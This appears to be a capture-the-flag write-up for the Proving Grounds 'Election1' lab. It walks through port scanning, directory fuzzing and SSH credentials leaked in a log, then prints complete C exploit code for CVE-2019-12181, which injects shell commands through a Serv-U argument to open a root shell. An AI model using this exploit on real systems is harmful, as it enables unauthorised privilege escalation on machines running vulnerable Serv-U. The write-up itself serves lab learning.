* * *
 ### Lab: Election1
 ### Platform: Proving Grounds
* * *

- Rustscan's scan details

          ❯ rustscan -a 192.168.153.211 -- -sC -sV
        .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
        | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
        | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
        `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
        The Modern Day Port Scanner.
        ________________________________________
        : https://discord.gg/GFrQsGy           :
        : https://github.com/RustScan/RustScan :
         --------------------------------------
        🌍HACK THE PLANET🌍
        
        [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
        [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
        [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
        Open 192.168.153.211:22
        Open 192.168.153.211:80
        [~] Starting Script(s)
        [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
        PORT   STATE SERVICE REASON  VERSION
        22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey: 
        |   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
        | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoqt4FP0lhkJ0tTiMEUrVqRIcNKgQK22LJCOIVa1yoZf+bgOqsR4mIDjgpaJm/SDrAzRhVlD1dL6apkv7T7iceuo5QDXYvRLWS+PfsEaGwGpEVtpTCl/BjDVVtohdzgErXS69pJhgo9a1yNgVrH/W2SUE1b36ODSNqVb690+aP6jjJdyh2wi8GBlNMXBy6V5hR/qmFC55u7F/z5oG1tZxeZpDHbgdM94KRO9dR0WfKDIBQGa026GGcXtN10wtui2UHo65/6WgIG1LxgjppvOQUBMzj1SHuYqnKQLZyQ18E8oxLZTjc6OC898TeYMtyyKW0viUzeaqFxXPDwdI6G91J
        |   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
        | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO9gF8Fv+Uox9ftsvK/DNkPNObtE4BiuaXjwksbOizwtXBepSbhUTyL5We/fWe7x62XW0CMFJWcuQsBNS7IyjsE=
        |   256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
        |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINfCRDfwNshxW7uRiu76SMZx2hg865qS6TApHhvwKSH5
        80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
        | http-methods: 
        |_  Supported Methods: GET POST OPTIONS HEAD
        |_http-server-header: Apache/2.4.29 (Ubuntu)
        |_http-title: Apache2 Ubuntu Default Page: It works
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

- Scanning for directories with ffuf reveals these directories

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/0314db07-803b-49bc-b0fc-ee0c8089e292)

- I scanned the `/election/` directory with ffuf and I discovered an `admin`directory

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/e9318af5-7af0-4627-8e99-509b8a5f218c)

- Ffuf discovered a `/logs/` directory after scanning the `/admin/` direcotory

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/f8d1babc-3df0-499d-9e5d-95816226f9a4)
  
- The logs directory contains a log file which reveals love ssh credentials

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/f7af2def-4872-48a4-adce-0e122f54a5ac)

- SSH access

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/03e41edd-2b47-4cab-aa7f-88eacd63fe79)

### PRIVESC

- The server contains a Serv-U ver 15.1.6 binary which has a local privilege escalation exploit.

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/d6e86270-d4f9-45f3-8e2d-2cee57510d17)

        /*
        
        CVE-2019-12181 Serv-U 15.1.6 Privilege Escalation 
        
        vulnerability found by:
        Guy Levin (@va_start - twitter.com/va_start) https://blog.vastart.dev
        
        to compile and run:
        gcc servu-pe-cve-2019-12181.c -o pe && ./pe
        
        */
        
        #include <stdio.h>
        #include <unistd.h>
        #include <errno.h>
        
        int main()
        {       
            char *vuln_args[] = {"\" ; id; echo 'opening root shell' ; /bin/sh; \"", "-prepareinstallation", NULL};
            int ret_val = execv("/usr/local/Serv-U/Serv-U", vuln_args);
            // if execv is successful, we won't reach here
            printf("ret val: %d errno: %d\n", ret_val, errno);
            return errno;
        }

- Root access

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/1107846c-a02b-4b04-8687-faf002fae805)
